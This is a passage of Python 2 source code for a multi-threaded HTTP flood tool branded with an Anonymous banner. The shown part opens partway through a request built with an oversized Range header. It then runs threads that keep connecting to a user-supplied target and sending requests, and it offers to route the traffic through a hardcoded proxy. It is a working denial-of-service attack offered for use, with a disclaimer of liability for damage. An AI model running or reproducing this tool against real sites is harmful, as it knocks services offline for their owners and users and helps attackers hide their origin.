-761,1-762,1-763,1-764,1-765,1-766,1-767,1-768,1-769,1-770,1-771,1-772,1-773,1-774,1-775,1-776,1-777,1-778,1-779,1-780,1-781,1-782,1-783,1-784,1-785,1-786,1-787,1-788,1-789,1-790,1-791,1-792,1-793,1-794,1-795,1-796,1-797,1-798,1-799,1-800,1-801,1-802,1-803,1-804,1-805,1-806,1-807,1-808,1-809,1-810,1-811,1-812,1-813,1-814,1-815,1-816,1-817,1-818,1-819,1-820,1-821,1-822,1-823,1-824,1-825,1-826,1-827,1-828,1-829,1-830,1-831,1-832,1-833,1-834,1-835,1-836,1-837,1-838,1-839,1-840,1-841,1-842,1-843,1-844,1-845,1-846,1-847,1-848,1-849,1-850,1-851,1-852,1-853,1-854,1-855,1-856,1-857,1-858,1-859,1-860,1-861,1-862,1-863,1-864,1-865,1-866,1-867,1-868,1-869,1-870,1-871,1-872,1-873,1-874,1-875,1-876,1-877,1-878,1-879,1-880,1-881,1-882,1-883,1-884,1-885,1-886,1-887,1-888,1-889,1-890,1-891,1-892,1-893,1-894,1-895,1-896,1-897,1-898,1-899,1-900,1-901,1-902,1-903,1-904,1-905,1-906,1-907,1-908,1-909,1-910,1-911,1-912,1-913,1-914,1-915,1-916,1-917,1-918,1-919,1-920,1-921,1-922,1-923,1-924,1-925,1-926,1-927,1-928,1-929,1-930,1-931,1-932,1-933,1-934,1-935,1-936,1-937,1-938,1-939,1-940,1-941,1-942,1-943,1-944,1-945,1-946,1-947,1-948,1-949,1-950,1-951,1-952,1-953,1-954,1-955,1-956,1-957,1-958,1-959,1-960,1-961,1-962,1-963,1-964,1-965,1-966,1-967,1-968,1-969,1-970,1-971,1-972,1-973,1-974,1-975,1-976,1-977,1-978,1-979,1-980,1-981,1-982,1-983,1-984,1-985,1-986,1-987,1-988,1-989,1-990,1-991,1-992,1-993,1-994,1-995,1-996,1-997,1-998,1-999,1-1000,1-1001,1-1002,1-1003,1-1004,1-1005,1-1006,1-1007,1-1008,1-1009,1-1010,1-1011,1-1012,1-1013,1-1014,1-1015,1-1016,1-1017,1-1018,1-1019,1-1020,1-1021,1-1022,1-1023,1-1024,1-1025,1-1026,1-1027,1-1028,1-1029,1-1030,1-1031,1-1032,1-1033,1-1034,1-1035,1-1036,1-1037,1-1038,1-1039,1-1040,1-1041,1-1042,1-1043,1-1044,1-1045,1-1046,1-1047,1-1048,1-1049,1-1050,1-1051,1-1052,1-1053,1-1054,1-1055,1-1056,1-1057,1-1058,1-1059,1-1060,1-1061,1-1062,1-1063,1-1064,1-1065,1-1066,1-1067,1-1068,1-1069,1-1070,1-1071,1-1072,1-1073,1-1074,1-1075,1-1076,1-1077,1-1078,1-1079,1-1080,1-1081,1-1082,1-1083,1-1084,1-1085,1-1086,1-1087,1-1088,1-1089,1-1090,1-1091,1-1092,1-1093,1-1094,1-1095,1-1096,1-1097,1-1098,1-1099,1-1100,1-1101,1-1102,1-1103,1-1104,1-1105,1-1106,1-1107,1-1108,1-1109,1-1110,1-1111,1-1112,1-1113,1-1114,1-1115,1-1116,1-1117,1-1118,1-1119,1-1120,1-1121,1-1122,1-1123,1-1124,1-1125,1-1126,1-1127,1-1128,1-1129,1-1130,1-1131,1-1132,1-1133,1-1134,1-1135,1-1136,1-1137,1-1138,1-1139,1-1140,1-1141,1-1142,1-1143,1-1144,1-1145,1-1146,1-1147,1-1148,1-1149,1-1150,1-1151,1-1152,1-1153,1-1154,1-1155,1-1156,1-1157,1-1158,1-1159,1-1160,1-1161,1-1162,1-1163,1-1164,1-1165,1-1166,1-1167,1-1168,1-1169,1-1170,1-1171,1-1172,1-1173,1-1174,1-1175,1-1176,1-1177,1-1178,1-1179,1-1180,1-1181,1-1182,1-1183,1-1184,1-1185,1-1186,1-1187,1-1188,1-1189,1-1190,1-1191,1-1192,1-1193,1-1194,1-1195,1-1196,1-1197,1-1198,1-1199,1-1200,1-1201,1-1202,1-1203,1-1204,1-1205,1-1206,1-1207,1-1208,1-1209,1-1210,1-1211,1-1212,1-1213,1-1214,1-1215,1-1216,1-1217,1-1218,1-1219,1-1220,1-1221,1-1222,1-1223,1-1224,1-1225,1-1226,1-1227,1-1228,1-1229,1-1230,1-1231,1-1232,1-1233,1-1234,1-1235,1-1236,1-1237,1-1238,1-1239,1-1240,1-1241,1-1242,1-1243,1-1244,1-1245,1-1246,1-1247,1-1248,1-1249,1-1250,1-1251,1-1252,1-1253,1-1254,1-1255,1-1256,1-1257,1-1258,1-1259,1-1260,1-1261,1-1262,1-1263,1-1264,1-1265,1-1266,1-1267,1-1268,1-1269,1-1270,1-1271,1-1272,1-1273,1-1274,1-1275,1-1276,1-1277,1-1278,1-1279,1-1280,1-1281,1-1282,1-1283,1-1284,1-1285,1-1286,1-1287,1-1288,1-1289,1-1290,1-1291,1-1292,1-1293,1-1294,1-1295,1-1296,1-1297,1-1298,1-1299\r\n" 
			            "Accept-Encoding: gzip,deflate,compress\r\n\r\n" % 
			            (magicoutput, self.host, random.choice(useragents)))

		self.socks.close()


	def run(self):
		while self.running:
			while self.running:
				try:
					if self.tor:     
						self.socks.setproxy(socks.PROXY_TYPE_HTTP, "186.200.35.147", 80)
					self.socks.connect((self.host, self.port))
					print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
					break
				except Exception, e:
					print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL
					time.sleep(1)
					continue
			while self.running:
				try:
					self._send_http_post()
				except Exception, e:
					print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL
					self.socks = socks.socksocket()
					break
					pass
					time.sleep(1)
 
def main(argv):
    
    try:
        opts, args = getopt.getopt(argv, "Aw:c:n:", ["tor", "target=", "threads=", "port="])
    except getopt.GetoptError:
        usage() 
        sys.exit(-1)

    global stop_now 
	
    target = raw_input('target: ')
    threads = input('threads: ')
    msg = 'Shall I a proxy?'
    shall = raw_input("%s (y/N) " % msg).lower() == 'y'
    tor = shall
    port = input('port: ')

    for o, a in opts:
        if o in ("-A", "--tor"):
            tor = True
        elif o in ("-w", "--target"):
            target = a
        elif o in ("-c", "--threads"):
            threads = int(a)
        elif o in ("-n", "--port"):
            port = int(a)

    if target == '' or int(threads) <= 0:
        usage()
        sys.exit(-1)
    print term.DOWN + term.RED + "/*" + term.NORMAL
    print term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL
    print term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL
    print term.RED + " * Give 20 seconds without tor or 40 with before checking site" + term.NORMAL
    print term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL

    rthreads = []
    for i in range(threads):
        t = httpGet(target, port, tor)
        rthreads.append(t)
        t.start()

    while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
        except KeyboardInterrupt:
            print "\nShutting down threads...\n"
            for t in rthreads:
                stop_now = True
                t.running = False

if __name__ == "__main__":

    print'                                                   '
    print' _________________________________________________ '
    print'|..."WE ARE NOT LIABLE FOR THE DAMAGE YOU CAUSE"..|'
    print'|..."Coded By Binary@BinarySecurity.".............|'
    print'|..."We are Anonymous."...........................|'
    print'|..."We do not forgive."..........................|'
    print'|..."We do not forget."...........................|'
    print'|..."Expect us!"..................................|'
    print'|_________________________________________________|'
    print'  .         . . ... .,~?I777?=,. . ... . .'
    print'             .... :+ZO$I?I??I$OOI~.  .  .'  
    print'          . ..  :7OI~....  .. .~IOZ+. .. .'
    print'          ... ,7O+..   .......  ..=O$: .'  
    print'          ... ,7O+..   .......  ..=O$: .' 
    print'       ...  .~OI    ......   ....  .?D= . ...' 
    print'       .....+O~ ....      .     ..   :87......'
    print'       ... ?O... .. ... .... ...  ...  O$.....'  
    print'      ...+O....... ..,,,,:,,,.. .. ....O7.....'  
    print'   .  .  ~O,  .+...,,,,,,,,,,,,,, ..=, . 8? .. ..'
    print'     . ..Z~..=NI..,, ...,.,. ,: ,:. +M?..:8~ .   .'
    print'  . ..  I7.=?MZ..:,,..., .. , .,.,,..7MI? IZ.. . .'
    print'  . .. :O IZ88, ,...:,.,,=I~.,,:,. :..ZN$$ O+ ...'
    print'   ... 7+.D$7I:,, .,..,,?$7D., .,...,,II$N,=O . .'
    print'   .  ,Z:ID=OZ.,. ...., ,:$7 ,..,,  ,,I8~87:O~.  .'
    print'  . . +II$88Z,.,..,.. ,. ,+ ...  :.,.,.$D8$7?$....'
    print'  . . $~O7NZ=.,  ,,,.,:,.::..:,,:,,....~7M78:8  .'
    print'    ..$,D$?O?.,  ., .,,:.7O ,,,..... ..+OI7N.O~. .'
    print'  .. :$ D7$N., ..,.. ., .::. ..  .,..., 88?M.7? ..'
    print'  . .=7=8NM~.,   . . ,,. .. .., ..,. .,.:DN8+7I..'
    print'   . .=7=8NM~.,   . . ,,. .. .., ..,. .,.:DN8+7I..'
    print'  .. ??O7$$7 ,,..,, .,+D.+7.OI...,:,....?$$I8?$ ..'                                      
    print'  . .?+$8=M+.,.  , ?$DMO.=? 7M8I+,,. ., :M+$8+$. .'
    print'   . ??~MIM. , ...~MMMMO ~? $MMMMZ.   ..,D7N++Z  .'
    print'     =7:8MZ?.,. . ?MMMM8 ?8 ZMMMMD, ..,.=$NN~II .'
    print'   . ~$I+MIO:...  ZMMMMM.ID NMMMMN,. .,.O?M?IZ+ .'
    print'  . ..7$$I7D~.,..,OMMMMM=ID=MMMMMM:..,.,N7I7$Z~ ..'
    print'   . .7+M$=M+ ,,. NMMMMMOZNZMMMMMM~.., =M?IM?O...'
    print'  . . ???M7D$+ , ~MMMMMMMNMMMMMMMM? ,.=7NIM$?$ ..'
    print'   .  .,Z:OMM7O:..+MMMMMMMMMMMMMMMM?.,.OIMM8:Z= .'  
    print'    .. .7?7IN$O7 .?MMMMMMMMMMMMMMMM$. ?87MIIIZ....'
    print'   . .. ,$IN7+IN:.IMMMMMMMMMMMMMMMM$.,D$+7D7$+ . ..'
    print'   .  ...7?7MD?N7?7MMMMMMMMMMMMMMMMZ?7N?OMZ+O.. .' 
    print'   . . . .O:+NMNNZNMMMMMMMMMMMMMMMMMZ8MNNI,D~ . . .'
    print'    .  .. ~Z:7IIZ+$MMMMMMMMMMMMMMMMZ=OI?$:O?. . . .'
    print'    . . .. ?Z+D8OZZMMMMMMMMMMMMMMMMZOZON+7$, ..  .'
    print'    . .  . .?$,$8OZ?+NMMMMMMMMMMO+?ZZ8$,7Z. ...  .'
    print'   .   ..  ..+O,+?+$NMMMMMMMMMMMMNZ?+?:Z$  ..    .' 
    print'     . ..  . .~8I78NDMMMMMMMMMMMDOMD$ID+ .. .  .' 
    print'     .   .. ,. ,7$= =MMMMMMMMMMMO .~$O:.... ....'  
    print'   . ... .  . . .:$ZOMMMMMMMMMMMD?OO+ .. . .    . .'

    main(sys.argv[1:])



